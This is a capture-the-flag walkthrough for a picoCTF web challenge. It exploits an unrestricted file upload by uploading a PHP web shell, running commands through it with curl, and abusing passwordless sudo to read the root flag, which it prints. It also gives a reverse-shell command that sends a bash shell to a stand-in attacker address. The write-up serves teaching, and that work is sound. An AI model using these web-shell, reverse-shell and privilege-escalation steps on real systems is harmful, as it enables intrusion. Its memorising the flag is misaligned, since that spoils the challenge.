Challenge Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.

Solution

This is my first web challenge walkthrough, and I’ll be explaining my thought process step by step. The goal of this walkthrough is to not only show how I solved the challenge but also to help others understand the methodology behind web exploitation.

Accessing the challenge on the browser:

Looking at the webpage, the challenge seems to be a file upload vulnerability, commonly referred to as Unrestricted File Upload or Arbitrary File Upload. This allows users to upload files without proper validation or security controls, potentially leading to remote code execution (RCE), defacement, or other attacks.

I tried uploading a file that is not an image file and the upload was successful, so the upload section was not validated to only allow image files to be uploaded. So it wasn't necessary to bypass extension restrictions.

I crafted a simple Remote Code Execution (RCE) payload often used in file upload vulnerabilities. This script takes input from the URL parameter cmd and executes it on the server using the system() function. I saved it as exploit.php:

After uploading the file, the website gives a URL path that can be used to access the file, which was an easy way out...

Now I had to access the file, remembering it was a scripted payload. So I accessed the file using this path so that I can execute commands:

curl http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=whoami

OR you can use this payload to get a reverse shell:

curl http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=nc -e /bin/bash ATTACKER_IP 4444

It gives the response:

So I had to check the sudo privileges of the user www-data and got a response which showed a critical privilege escalation vulnerability where the user www-data can run any command as root without a password:

I saw it was easy at this point because I knew the flag was in the root directory as the challenge description says. I first tried to list the files in the root directory and I was getting no response... then realized I had to use the command with sudo. Hence I arrived at this:

curl "http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=sudo ls -a /root"

Then the obvious one, I just had to read the flag so I used this:

curl "http://standard-pizzas.picoctf.net:56275/uploads/exploit.php?cmd=sudo cat /root/flag.txt"
picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}

P.S: Do not copy paste the flag; the last part of the flag is unique for every user.
